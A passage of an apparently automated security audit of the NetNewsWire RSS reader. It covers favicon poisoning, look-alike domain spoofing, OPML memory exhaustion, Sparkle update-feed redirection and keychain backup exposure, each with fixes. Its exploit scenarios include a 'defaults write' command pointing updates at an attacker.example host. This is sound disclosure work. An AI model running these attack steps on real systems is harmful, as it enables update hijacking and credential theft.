The private helper `isNetNewsWireBrandedFeed` (line 112) extracts the `host` component from the feed's `homePageURL` and checks `host.hasSuffix("netnewswire.com")` (line 114). Swift's `hasSuffix` is a plain string suffix test with no concept of DNS label boundaries, so any host whose bare string ends with the literal characters 'netnewswire.com' passes — including 'evil-netnewswire.com', 'fakenetnewswire.com', or 'badactornetnewswire.com'. The `homePageURL` field is taken directly from user-fetched feed XML/JSON (the `feed.homePageURL` property populated by the RSS/Atom/JSON-Feed parser from remote, attacker-controlled content). When `isNetNewsWireBrandedFeed` returns `true`, `imageForFeed(_:_:)` (line 133) immediately returns `IconImage.nnwFeedIcon` — the official NetNewsWire icon — bypassing all further icon-fetching logic. The correct guard requires a leading dot: `host == "netnewswire.com" || host.hasSuffix(".netnewswire.com")`.

#### Impact
An attacker who operates any domain whose string representation ends with 'netnewswire.com' (e.g., 'evil-netnewswire.com') can make their feed display the official NetNewsWire brand icon in the user's sidebar. This enables a social-engineering/phishing vector where a malicious feed appears to be an official NetNewsWire publication, eroding user trust indicators.

#### Exploit scenario
Attacker registers 'evil-netnewswire.com' and publishes an Atom feed there whose `<link>` element (parsed as `homePageURL`) points to 'https://evil-netnewswire.com/'. The feed's title could be 'NetNewsWire Official Updates'. When a user subscribes, `isNetNewsWireBrandedFeed` returns `true` and the sidebar displays the genuine NetNewsWire brand icon next to the attacker's feed. The user may trust the feed as official, increasing the likelihood of clicking embedded phishing links in articles.

#### Preconditions
- Attacker must register a domain whose hostname string ends with 'netnewswire.com', e.g. 'evil-netnewswire.com' — freely registrable since it is a different TLD+1 from 'netnewswire.com'.
- A user must manually subscribe to the attacker's feed URL.

```
if host == "nnw.ranchero.com" || host == "netnewswire.blog" || host.hasSuffix("netnewswire.com") {
    return true
}
```

#### How to fix
Replace the bare `hasSuffix` check with a subdomain-aware comparison: `host == "netnewswire.com" || host.hasSuffix(".netnewswire.com")`. This ensures that only exact matches and genuine subdomains of netnewswire.com receive the branded icon. Apply the same fix logic to the `host == "nnw.ranchero.com"` and `host == "netnewswire.blog"` checks if those domains ever gain subdomains that should also be branded.

**Exploitability:** isNetNewsWireBrandedFeed uses hasSuffix('netnewswire.com') with no leading-dot anchor, so any hostname ending in those characters (evil-netnewswire.com) receives the official NNW icon, enabling UI spoofing for look-alike feeds. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L). Integrity-only impact; no code execution path.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — `hasSuffix("netnewswire.com")` with no leading-dot guard allows any domain string-ending in those characters (e.g. `evil-netnewswire.com`) to claim the official NNW brand icon; `homePageURL` is populated verbatim from attacker-controlled feed XML with no domain validation at any layer.

I have gathered all the evidence needed. Let me summarize my findings:

**A. Code confirmed (lines 112–119):**
`host.hasSuffix("netnewswire.com")` is a pure string suffix check — no DNS label-boundary awareness. A host like `evil-netnewswire.com` passes because it literally ends with the string `"netnewswire.com"`. The fix would be `host == "netnewswire.com" || host.hasSuffix(".netnewswire.com")`.

**B. Data flow confirmed as attacker-controlled:**
- RSS parser: `homepageURLString = parser.currentStringWithTrimmedWhitespace` directly from `<link>` element text (RSSParser.swift line 292)
- Atom parser: `homepageURLString` set from `<link rel="alternate">` href (AtomParser.swift)
- `Feed.homePageURL` setter only calls `.normalizedURL` (trivial URL normalization — handles trailing slashes, no domain validation)
- No allowlist, no origin validation, no sanitization at any layer

**C. Defence search:**
- There is no upstream filtering of `homePageURL`; `normalizedURL` is URL-form normalization only
- The `Feed.homePageURL` setter has an empty-string guard but no domain restriction
- No feature flag, no auth gate, no allow-list wraps `isNetNewsWireBrandedFeed`

**D. Probe the defence:**
There is no defence to probe. The `hasSuffix` is the sole guard, and it is demonstrably bypassable by any domain that ends with the four characters `netnewswire.com` at string level.

**Impact assessment:**
When `isNetNewsWireBrandedFeed` returns `true`, `imageForFeed` at line 133–135 immediately returns `IconImage.nnwFeedIcon` — the actual branded app icon asset — bypassing all FeedIconDownloader and FaviconDownloader logic. This is displayed in the sidebar next to the attacker-controlled feed. The impact is limited to visual brand impersonation (social engineering aid); there is no code execution, no data exfiltration, no auth bypass. The user must have actively subscribed to the attacker's feed (UI:R).

### 46. [MEDIUM] Malicious Feed Poisons Favicon-URL Mapping for Arbitrary Hostnames
**Class:** CWE-284: Improper Access Control
**CWE:** CWE-284: Improper Access Control - https://cwe.mitre.org/data/definitions/284.html
**File:** `Modules/Images/Sources/Images/FaviconDownloader.swift:251-258`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
Entry point: `FaviconDownloader.favicon(for:)` at line 67 reads `feed.faviconURL` and `feed.homePageURL` directly from parsed feed content (RSS `<image><url>`, JSON Feed `favicon`/`icon` fields), both of which are attacker-controlled. It calls `favicon(with:homePageURL:)` at line 76 which does a scheme check (http/https) then calls the private `faviconDownloader(withURL:homePageURL:)` at line 251.

Inside `faviconDownloader(withURL:homePageURL:)` (lines 254-257):
```swift
if let homePageURL, ImageMetadataDatabase.shared.faviconURL(forHomePageURL: homePageURL) == nil {
    ImageMetadataDatabase.shared.saveHomePageFavicon(homePageURL: homePageURL, faviconURL: faviconURL)
```
There is no check that `faviconURL` (attacker-supplied) is topically related to `homePageURL` (also attacker-supplied). The guard is only `== nil`, meaning the first call wins and the mapping can never be displaced by a later legitimate feed. The association is immediately written through to the SQLite `homePageFavicon` table (`HomePageFaviconTable.save` with `insertType: .orReplace` is a no-op for an existing row because the write already happened). Subsequent reads via `FaviconDownloader.favicon(withHomePageURL:)` (line 154) hit `ImageMetadataDatabase.shared.faviconURL(forHomePageURL: url)` first and short-circuit to the poisoned URL, never triggering an HTML metadata lookup that would discover the real favicon.

#### Impact
An attacker who publishes a feed can persistently associate their chosen favicon URL with any homePageURL in the local ImageMetadataDatabase. Because the first-write-wins check (line 255) prevents a later legitimate feed from overwriting the mapping, every subsequent lookup for that homePageURL — including for entirely different, legitimate feeds — will silently return the attacker's image. Within the RSS reader this enables visual spoofing: the attacker's icon is rendered in the sidebar wherever the victim hostname would normally appear.

#### Exploit scenario
Attacker publishes a JSON Feed at `https://attacker.com/feed.json` containing `"favicon": "https://attacker.com/bank-spoof.png"` and `"home_page_url": "https://trusted-bank.com/"`. User subscribes to the feed. During refresh, `saveHomePageFavicon(homePageURL: "https://trusted-bank.com/", faviconURL: "https://attacker.com/bank-spoof.png")` is written to the local SQLite database. If the user also subscribes (now or later) to a legitimate feed whose homePageURL resolves to `https://trusted-bank.com/`, `FaviconDownloader.favicon(withHomePageURL:)` line 154 retrieves the poisoned URL and renders the attacker's image in the feed sidebar — permanently, across app restarts, until the database is manually cleared.

#### Preconditions
- User subscribes to an attacker-controlled RSS/Atom/JSON feed
- The attacker's feed claims a homePageURL matching a target legitimate site
- No prior favicon mapping exists for that homePageURL in the local ImageMetadataDatabase (first-write wins; satisfied for new installations or new feed domains)

```
func faviconDownloader(withURL faviconURL: String, homePageURL: String?) -> SingleFaviconDownloader {
    var firstTimeSeeingHomepageURL = false

    if let homePageURL, ImageMetadataDatabase.shared.faviconURL(forHomePageURL: homePageURL) == nil {
        // BUG: faviconURL is attacker-supplied feed metadata; no check that it
        // originates from homePageURL's own HTML. First write wins permanently.
        ImageMetadataDatabase.shared.saveHomePageFavicon(homePageURL: homePageURL, faviconURL: faviconURL)
        firstTimeSeeingHomepageURL = true
    }
```

#### How to fix
The `faviconURL` stored under a `homePageURL` key should only come from HTML metadata fetched directly from that homePageURL (i.e., from `findFaviconURLs(with:)` / HTMLMetadataDownloader), never from feed-supplied metadata. In `faviconDownloader(withURL:homePageURL:)` (FaviconDownloader.swift ~line 254) the unconditional `saveHomePageFavicon` call should be removed or replaced with a write that only fires when the URL was discovered via `findFaviconURLs(with:)` for that exact homePageURL. Feed-supplied icon URLs (`feed.faviconURL`) should be stored only in the per-feed `feedIconURL` table (via `saveFeedIconURL`) and must never be recorded as the canonical favicon for an arbitrary homePageURL.

**Exploitability:** FaviconDownloader stores the first attacker-supplied faviconURL for any homePageURL into SQLite on first write; subsequent legitimate fetches are short-circuited by the poisoned entry forever (orReplace is a no-op for existing rows). CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L). Permanent integrity corruption for a low-sensitivity asset.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 6/10) — mechanism fully confirmed: attacker-controlled `faviconURL`+`homePageURL` from feed content is written to the persistent `homePageFavicon` SQLite table on first-seen with no origin binding, permanently poisoning the favicon shown for arbitrary hostnames; impact is limited to visual/UI spoofing (wrong icon in sidebar), no data exfiltration or privilege escalation path exists

I now have a complete picture. Let me summarize my analysis:

**Analysis**

**Step A — What the code actually does (confirmed against source):**

`FaviconDownloader.swift` line 255–257 is exactly as described:
```swift
if let homePageURL, ImageMetadataDatabase.shared.faviconURL(forHomePageURL: homePageURL) == nil {
    ImageMetadataDatabase.shared.saveHomePageFavicon(homePageURL: homePageURL, faviconURL: faviconURL)
```
This is a **first-write-wins** guard. Once a mapping exists in the in-memory `homePageToFaviconURL` dict, subsequent calls for the same `homePageURL` skip the save entirely. The SQLite schema (`insertType: .orReplace`) would allow overwrites, but the in-memory check short-circuits before reaching the DB for an already-seen hostname.

**Step B — Data flow traced to external entry point:**

`DataExtensions.swift` line 42–48 (`takeSettings(from parsedFeed:)`) directly assigns `feed.faviconURL = parsedFeed.faviconURL` and `feed.homePageURL = parsedFeed.homePageURL` — both sourced verbatim from parsed feed content (JSON Feed `favicon`/`home_page_url` fields, RSS `<image><url>`). These are unambiguously attacker-controlled. The call chain is: network fetch → RSParser → `takeSettings` → `favicon(for: feed)` at line 67 → `favicon(with:homePageURL:)` at line 133 → `faviconDownloader(withURL:homePageURL:)` at line 251 → DB write.

**Step C — Defences examined:**

1. **Scheme check (line 134):** Only validates `http://` or `https://` prefix on `faviconURL`. Does NOT check that `faviconURL`'s host matches `homePageURL`'s host.
2. **`recentlyFailed` check (line 138):** URL failure tracking — unrelated, no protection here.
3. **`== nil` guard (line 255):** This is NOT a defence; it's the mechanism of the bug. It prevents legitimate overwrite of a poisoned mapping.
4. **No host-binding check anywhere** in the path.

**Step D — Edge cases / scope:**

The `homePageURL` setter in `Feed.swift` runs `url.normalizedURL` — this is cosmetic normalization, not origin validation. An attacker-supplied `homePageURL` of `https://trusted-bank.com/` passes through unchanged. The poisoning persists across restarts (SQLite, loaded at startup via `loadCachesFromDatabase()`), and the `== nil` guard ensures the legitimate feed can never overwrite it later.

**Impact assessment:**

The attack results in the wrong favicon (attacker's image) being displayed in the RSS reader sidebar for a legitimate site's feed — permanently until the user clears the DB. This is a **UI integrity / visual spoofing** issue. There is no data exfiltration, no auth bypass, and no code execution. The app does make an outbound request to the attacker's server to download the poisoned image, which leaks timing/subscription info but is not a direct data leak.

Under the NOISE FLOOR rule: "no demonstrated path to data exposure, auth bypass, or code execution" — the outcome is cosmetic (wrong icon displayed). The path IS demonstrated (not theoretical), but the impact ceiling is UI misleading with no privilege escalation.

Conclusion: TRUE_POSITIVE — the mechanism is completely confirmed and exploitable via normal user action (subscribing to an attacker's feed), the data flow from feed content to persistent DB is direct, there is no host-binding defence, and the first-write-wins semantics make the poisoning permanent. However, severity is low: impact is constrained to visual spoofing of favicons within the RSS reader's sidebar, with no path to credential theft, code execution, or meaningful data exposure.

### 47. [MEDIUM] OPML outline parser has no nesting-depth limit enabling memory exhaustion
**Class:** CWE-400: Uncontrolled Resource Consumption
**CWE:** CWE-400: Uncontrolled Resource Consumption - https://cwe.mitre.org/data/definitions/400.html
**File:** `Modules/RSParser/Sources/RSParser/Feeds/XML/OPMLParser.swift:71-108`
**CVSS 3.1:** **5.5** (Medium) — `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:L (non-network)*
**Confidence:** 0.78 (1 run agreed)

#### Description
In OPMLParserDelegate.xmlSAXParser(_:didStartElement:) at lines 85-87, every <outline> element unconditionally creates a new OPMLItem and appends it to itemStack. No maximum depth is checked. Because XMLSAXParser is iterative (SAX-style), the system imposes no native recursion limit; itemStack.count grows linearly with nesting depth. A file with 1,000,000 nested <outline> elements allocates one million OPMLItem instances plus their attribute dictionaries, consuming hundreds of MiB. The complementary pop in xmlSAXParser(_:didEndElement:) at line 104 does check itemStack.count > 1, so it is safe from underflow, but does nothing to prevent unbounded growth during parsing.

#### Impact
A crafted OPML file with arbitrarily deep <outline> nesting causes OPMLParserDelegate to grow itemStack without bound, exhausting process memory and killing NetNewsWire. This is a local denial-of-service that corrupts any in-progress state at the time of crash.

#### Exploit scenario
An attacker generates a ~20 MB OPML file consisting entirely of a million nested <outline text='x'> tags with no closing tags until the end. The victim imports it via File → Import Subscriptions. OPMLParserDelegate allocates a million OPMLItem objects; the process exceeds its memory limit, is killed by the OS OOM manager, and NetNewsWire crashes, discarding any unsaved reading state.

#### Preconditions
- Victim must import a malicious OPML file via the Import Subscriptions menu (same social-engineering vector as Finding 2)

```
let item = OPMLItem(attributes: attributes.dictionary())
currentItem.addChild(item)
itemStack.append(item)  // ← no depth limit; grows to nesting depth of input document
```

#### How to fix
Add a depth constant (e.g., private let maxOutlineDepth = 100) and guard against it in xmlSAXParser(_:didStartElement:) before appending: guard itemStack.count < maxOutlineDepth else { return }. Additionally, validate total document byte size in OPMLParser.parseOPML before handing data to the SAX parser.

**Exploitability:** OPML parser maintains an unbounded itemStack; 1M nested <outline> elements allocate hundreds of MiB and OOM-crash the app. CVSS 5.5 (AV:L/AC:L/PR:N/UI:R/A:H) — downgraded from Medium: AV:L requires the user to open a malicious local file from Finder; no remote trigger path identified. DoS impact only.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — no depth or file-size limit anywhere in the OPML parse chain; a single crafted import crashes the process via OOM; reachable via normal user-facing file import on both platforms

I now have all the evidence I need to make my determination. Here is my analysis:

**A. What the code actually does**

`OPMLParser.swift` lines 85-87 confirmed: every `<outline>` SAX start-element unconditionally creates an `OPMLItem` and appends it to `itemStack`. No depth ceiling exists anywhere in the delegate. The matching pop at line 104 correctly guards against underflow (`itemStack.count > 1`) but does nothing to cap growth.

**B. External entry points**

The call chain to the parser is completely reachable:
- **macOS**: `AppDelegate.importOPMLFromFile(_:)` → `ImportOPMLWindowController.importOPML(account:)` (NSOpenPanel, user picks file) → `Account.importOPML(_:completion:)` → `LocalAccountDelegate.importOPML(opmlFile:)` → `OPMLParser.parseOPML(with:)`
- **iOS**: `SettingsViewController → importOPMLDocumentPicker()` → `UIDocumentPickerViewController` (user picks file) → `Account.importOPML` → same parser

Both are genuine user-facing, production-reachable entry points. No auth/authz gate stands in front of either — any user who can operate the UI can trigger this.

**C. Searching for defences**

A codebase-wide search for `maxDepth`, `depthLimit`, `maxItems`, `sizeLimit`, `fileSizeLimit`, `contentLength` returns **zero matches**. There is:
- No file-size cap before `Data(contentsOf:)` reads the entire file
- No nesting-depth cap in `OPMLParserDelegate`
- No item-count cap anywhere in the parse/import chain
- No OS-level XML quota (the app uses its own custom `XMLSAXParser`, not `XMLParser`/libxml2 which carry their own limits)

**D. Verdict reasoning**

This is a confirmed input-driven unbounded allocation (one crafted file → O(N) `OPMLItem` heap objects + attribute dictionaries, with N unlimited). The SAST "pure DoS — infra concern" exclusion explicitly carves out *"input-driven complexity blowups (…unbounded allocation from a single request)"* and keeps them in scope. The social-engineering precondition (victim must import the file via the normal UI) is the CVSS `UI:R` factor, not a reason to discard the finding. A plausible real-world delivery channel exists: an attacker publishes a "starter pack" OPML subscription list and tricks a user into importing it.

### 48. [MEDIUM] Sparkle update feed URL writable by any same-user process via UserDefaults
**Class:** CWE-494
**CWE:** CWE-494 - https://cwe.mitre.org/data/definitions/494.html
**File:** `Mac/Preferences/Advanced/AdvancedPreferencesViewController.swift:16-27`
**CVSS 3.1:** **5.2** (Medium) — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:L (non-network)*
**Confidence:** 0.75 (1 run agreed)

#### Description
Lines 16–18 show that `releaseBuildsURL` and `testBuildsURL` are read from the app's `Info.plist`, and `appcastDefaultsKey` is the string literal `"SUFeedURL"`. Lines 25–27 write the chosen URL directly into `UserDefaults.standard` under that well-known Sparkle key: `UserDefaults.standard.set(newValue ? testBuildsURL : releaseBuildsURL, forKey: appcastDefaultsKey)`. Sparkle reads `SUFeedURL` from `NSUserDefaults` at update-check time (this is documented Sparkle 1.x/2.x behaviour and confirmed by the fact that the preferences pane relies on it working). macOS `UserDefaults.standard` for a given bundle ID is backed by `~/Library/Preferences/<bundle-id>.plist`, a file readable and writable by any process running as the same UID — including sandboxed apps (via the `defaults` subsystem) and any process with user-level code execution. There is no validation of the stored value when it is later consumed by Sparkle; the entire redirect is transparent to the user.

#### Impact
Any process running as the same macOS user — including a malicious sandboxed app or a compromised browser extension — can redirect NetNewsWire's Sparkle update feed to an attacker-controlled server. The attacker-controlled server learns the app's version, receives the update ping, and — if Sparkle's EdDSA signature verification is disabled, misconfigured, or bypassed — can deliver a malicious update binary. Even with correct signature verification the URL redirect constitutes an integrity violation of the update-check mechanism and leaks usage metadata to the attacker's infrastructure.

#### Exploit scenario
A malicious application installed by the same macOS user (or a sandbox escape from a compromised browser extension) executes `UserDefaults(suiteName: "com.ranchero.NetNewsWire")?.set("https://attacker.example/evil.xml", forKey: "SUFeedURL")` — or equivalently `defaults write com.ranchero.NetNewsWire SUFeedURL https://attacker.example/evil.xml`. On the next automatic update check, NetNewsWire fetches `evil.xml`. If Sparkle's EdDSA key (`SUPublicEDKey`) is absent or the attacker has obtained the private signing key, Sparkle installs the attacker's binary as a legitimate application update, achieving persistence and privilege through the user's own trusted app. Even without signature bypass, the attacker's server receives the version string and IP address, and can serve a specially crafted appcast that triggers error-handling code paths in Sparkle.

#### Preconditions
- Attacker has code execution as the same local macOS user (e.g. via malicious App Store app, compromised browser extension, or sandbox escape)
- Either Sparkle EdDSA signature verification is absent/misconfigured in the NetNewsWire build, OR the attacker's goal is limited to information leakage and phishing (no signature bypass required for those sub-goals)

```
let appcastDefaultsKey = "SUFeedURL"

var wantsTestBuilds: Bool {
    get {
        return currentAppcastURL() == testBuildsURL
    }
    set {
        UserDefaults.standard.set(newValue ? testBuildsURL : releaseBuildsURL, forKey: appcastDefaultsKey)
    }
}

func currentAppcastURL() -> String {
    return UserDefaults.standard.string(forKey: appcastDefaultsKey) ?? ""
}
```

#### How to fix
Do not use `UserDefaults.standard` as the live source for the Sparkle feed URL. Instead, embed both the release and test-build URLs directly in `Info.plist` entries that are read only at build time and never overwritten at runtime. If runtime toggling is genuinely required, use a separate internal default that is re-mapped to `SUFeedURL` only through Sparkle's `SPUUpdaterDelegate.feedURLString(for:)` delegate method, which limits the value to the two compile-time constants without ever persisting it under the well-known `SUFeedURL` key. Additionally, audit that `SUPublicEDKey` is present and non-empty in `Info.plist` so Sparkle's EdDSA signature gate is unconditionally active.

**Exploitability:** Sparkle update feed URL is stored in UserDefaults under the well-known SUFeedURL key, writable by any same-user process. Redirecting updates requires local code execution plus Sparkle to auto-install the poisoned update — two independent preconditions. CVSS 5.0 (AV:L/AC:L/PR:L/S:C) but downgraded for AV:L and multi-step attack chain.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — startup-only allowlist leaves a post-launch write window; same-UID process can redirect Sparkle's update feed URL after the app has started, yielding IP/version disclosure and phishing at minimum; full code execution if EdDSA key is absent or compromised

Now I have enough data. Let me synthesize the full picture.

---

**Analysis**

**A. What the code actually does (lines 16–27)**

Confirmed: `AdvancedPreferencesViewController` reads two URLs from `Info.plist` and writes the user-chosen one to `UserDefaults.standard` under the key `"SUFeedURL"`. This is the exact key Sparkle reads when scheduling update checks.

**B. Upstream defences — the critical one**

`Mac/AppDelegate.swift` lines 171–179 contain an **allowlist check that runs at `applicationDidFinishLaunching`**:

```swift
if let currentFeedURL = UserDefaults.standard.string(forKey: "SUFeedURL"),
   currentFeedURL != releaseBuildsURL && currentFeedURL != testBuildsURL {
    UserDefaults.standard.set(releaseBuildsURL, forKey: "SUFeedURL")
}
```

This check resets the URL to the release build URL if it is neither of the two hardcoded Info.plist values. It runs **once at startup, before** `SPUUpdater.start()` is called.

**C. Does that defence fully close the path?**

**No — it is startup-only.** The sequence of events exposes a post-launch window:

1. App starts → startup check validates URL → Sparkle is initialised.
2. External same-UID process runs `defaults write com.ranchero.NetNewsWire SUFeedURL https://attacker.example/evil.xml` (or equivalent API).
3. Sparkle's next **scheduled background check** (cfprefsd synchronises the value; Sparkle re-reads `SUFeedURL` at each check interval) fetches the attacker's appcast.

The `UserDefaults.didChangeNotification` observer in `AdvancedPreferencesViewController` calls only `updateUI()` — it does **not** re-validate the URL.

**D. EdDSA situation**

`SUPublicEDKey` is **absent from every file in this repository** (Info.plist, all xcconfigs, all build scripts). It may be injected during a private CI/signing step not visible here. In Sparkle 2.x, if the key is missing the updater refuses to proceed, so production builds presumably have it — but that cannot be confirmed from source alone.

Without EdDSA bypass: the attacker's server still receives the version string and IP (information disclosure), and can serve a crafted appcast that triggers error paths or displays a fake update prompt (phishing). Full binary injection requires the EdDSA private key as well.

The sandbox (`com.apple.security.app-sandbox: true`) limits what a **sandboxed** attacker app can do to cross-domain prefs, but an unsandboxed binary or script running as the same UID faces no such restriction — and `defaults write` is definitionally unsandboxed.

**Summary**

- The scanner correctly identifies that the startup-only allowlist leaves a post-launch window.  
- Real impact without EdDSA compromise: IP/version disclosure + phishing via crafted appcast UI.  
- Real impact with EdDSA compromise (or absent in dev builds): arbitrary binary installation.  
- Prerequisite is local code execution as the same UID, which is a meaningful precondition.

### 49. [MEDIUM] Service credentials back up to plaintext-decryptable device backup
**Class:** CWE-311: Missing Encryption of Sensitive Data
**CWE:** CWE-311: Missing Encryption of Sensitive Data - https://cwe.mitre.org/data/definitions/311.html
**File:** `Modules/Secrets/Sources/Secrets/CredentialsManager.swift:48-49`
**CVSS 3.1:** **4.2** (Medium) — `CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:P (non-network)*
**Confidence:** 0.75 (1 run agreed)

#### Description
storeCredentials sets kSecAttrAccessibleAfterFirstUnlock (line 49) without the ThisDeviceOnly suffix. Apple's Security framework documentation explicitly states that items tagged with this attribute 'migrate to a new device when using encrypted backups', while the ThisDeviceOnly variant 'do not migrate'. Because kSecAttrSynchronizable is never set, iCloud Keychain sync is off by default, but iCloud/iTunes encrypted backup inclusion is independent of that flag and is controlled solely by the accessibility attribute. Every keychain item written here — including OAuth access and refresh tokens for Feedly and plain-text passwords for Feedbin/NewsBlur/ReaderAPI — is therefore exportable via any encrypted backup (local Finder/iTunes backup or iCloud backup). The deleteQuery path (lines 93-96) also silently ignores the SecItemDelete return status, meaning a failed delete leaves the old token in the keychain while the function continues and may throw errSecDuplicateItem from the subsequent SecItemAdd, silently breaking OAuth token rotation without removing the stale credential.

#### Impact
All service passwords and OAuth tokens (Feedbin, Feedly, NewsBlur, ReaderAPI) stored by NetNewsWire are included in encrypted device backups and will migrate to a new device. An attacker who obtains a local backup and its encryption password, or who compromises the user's iCloud account where backups are enabled, can extract every credential NetNewsWire has ever stored.

#### Exploit scenario
An attacker with momentary physical access to the victim's iPhone creates an encrypted local backup via Finder using any backup password they choose. They then use a commercially available backup-extraction tool (e.g., iMazing, iBackup Viewer) to dump the iOS keychain from the decrypted backup. Because kSecAttrAccessibleAfterFirstUnlock items are included in backups, all NetNewsWire credentials appear in the extracted keychain database, giving the attacker the user's Feedbin password and Feedly OAuth refresh token without ever touching the running device.

#### Preconditions
- Attacker must obtain an encrypted device backup — either momentary physical access to create a local backup, or compromise of the user's iCloud account to download an iCloud backup
- Attacker must know the local backup encryption password (set by the attacker if they initiate the backup) or must decrypt the iCloud backup (via iCloud account access)
- Attacker needs a standard backup-parsing or keychain-extraction tool; no bespoke exploit required

```
var query: [String: Any] = [kSecClass as String: kSecClassInternetPassword,
							kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlock,
							kSecAttrAccount as String: credentials.username,
							kSecAttrServer as String: server]
...
SecItemDelete(deleteQuery as CFDictionary)   // return value silently ignored
```

#### How to fix
Change the accessibility attribute from kSecAttrAccessibleAfterFirstUnlock to kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly (line 49). This retains background-refresh capability while preventing credential migration via backups. If cross-device transfer of credentials is genuinely desired, document the decision and enable explicit iCloud Keychain sync (kSecAttrSynchronizable: true) instead of relying on opaque backup behaviour. Additionally, check and handle the return value of SecItemDelete on line 96 — if the delete fails, do not attempt SecItemAdd and instead surface the error, to prevent silent failure of OAuth token rotation.

**Exploitability:** CredentialsManager stores keychain items with kSecAttrAccessibleAfterFirstUnlock (no ThisDeviceOnly suffix), allowing all sync credentials (OAuth tokens, plaintext passwords) to migrate to encrypted backups. CVSS 4.2 (AV:P/AC:H/C:H) — downgraded from Medium: physical access to an unlocked device AND possession of the backup decryption key are required simultaneously.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — `kSecAttrAccessibleAfterFirstUnlock` at line 49 is confirmed in source, no `ThisDeviceOnly` variant is used anywhere in the project, and Apple's documentation explicitly states these items migrate in encrypted backups; the secondary delete-ignore issue is partially mitigated by the subsequent add-failure check but the backup exposure stands on its own.

I have everything I need. Let me now synthesize the findings.

---

**Analysis**

**A. Code at cited location**

**Line 49** — confirmed: `kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlock`

The code sets the keychain accessibility to `kSecAttrAccessibleAfterFirstUnlock` (not the `ThisDeviceOnly` variant) for every credential written via `storeCredentials`. This is the single call site for keychain writes across the entire codebase — confirmed by Grep finding only one use of `kSecAttrAccessible` in the whole project, with zero occurrences of `ThisDeviceOnly` anywhere.

**Lines 93-96** — confirmed: `SecItemDelete` return value is discarded with no error check.

However, reading the full logic: if the delete silently fails, the subsequent `SecItemAdd` at line 98 will return `errSecDuplicateItem`, which is caught at lines 99–104 and **throws a `CredentialsError`** to the caller. So OAuth token rotation is not *silently* broken — errors are surfaced — but the stale credential persists in the keychain while the caller gets an exception. The scanner's characterization of this sub-issue is overstated.

**B. External entry points**

The iOS credential storage path is reachable through UI account setup flows (`FeedbinAccountViewController`, `NewsBlurAccountViewController`, `ReaderAPIAccountViewController`, `FeedlyAccountDelegate`) — all real, user-invoked paths that flow into `storeCredentials`. Every credential written goes through this one function.

**C. Defences assessed**

**For backup migration:**
- No `com.apple.developer.default-data-protection` entitlement is set (checked the iOS and Mac entitlements files directly).
- No `ThisDeviceOnly` accessor is used anywhere in the codebase (exhaustive Grep confirms zero matches).
- Per Apple's Security Framework documentation: `kSecAttrAccessibleAfterFirstUnlock` items *"are backed up with device backups and can be migrated to a new device"*, while `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` items are *"not available to be transferred to a new device."*
- `kSecAttrSynchronizable` is not set, so iCloud Keychain sync is off — but this is **orthogonal** to backup inclusion; encrypted device backups (local Finder/iTunes or iCloud) follow the `kSecAttrAccessible` attribute, not the synchronizable flag.

**No compensating controls exist** — there is no backup-exclusion entitlement, no `ThisDeviceOnly` suffix, and no whitebox encryption of the credential value before storage.

**D. Threat scenario realism**

The physical-access path (attacker plugs unlocked device into their Mac → creates encrypted backup with chosen password → extracts keychain with iMazing/iBackup Viewer) requires the device to already trust that computer or the user to tap "Trust" — making it a moderately high bar but documented in forensic toolkits and criminal arrest scenarios. The iCloud account compromise path requires AV:N with separate account-hijack preconditions.

The silent-delete concern: technically present at line 96, but operationally the subsequent add failure at line 98–104 is checked and throws. This secondary bug affects reliability of token rotation under error conditions rather than creating a silent security state.

---

### 50. [LOW] Force cast on untrusted webpage JavaScript data crashes Share Extension
**Class:** CWE-20: Improper Input Validation
**CWE:** CWE-20: Improper Input Validation - https://cwe.mitre.org/data/definitions/20.html
**File:** `Mac/ShareExtension/ShareViewController.swift:61-66`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
The Share Extension registers a JavaScript preprocessor file (SafariExt, declared in Info.plist line 43). When invoked from Safari, the webpage's JavaScript runs and sets `finalizeArgument` values that are delivered back as `NSExtensionJavaScriptPreprocessingResultsKey` in the property-list item provider. This dictionary is entirely attacker-controlled: the webpage's JS can set `url` to any JSON-serialisable value (Number, Array, Boolean, null). At line 61, `results` is typed as `NSDictionary`. At line 64, `results["url"]` is unconditionally force-cast to `String` with `as! String`. If the JavaScript has set `url` to, say, `42` (a Number/NSNumber), the Objective-C bridged value is `NSNumber`, not `NSString`, and Swift's `as!` trap fires, crashing the extension process with `EXC_BAD_INSTRUCTION`. The outer `if let url = URL(string: …)` guard only runs AFTER the forced cast succeeds, so it provides no protection.

#### Impact
A malicious webpage can crash the NetNewsWire Share Extension process by providing a non-String value for the 'url' key in its JavaScript preprocessor output. The extension crashes silently on every invocation from that page, denying the user the ability to subscribe to feeds via the share sheet from that origin. No data is exfiltrated, but the extension process is terminated.

#### Exploit scenario
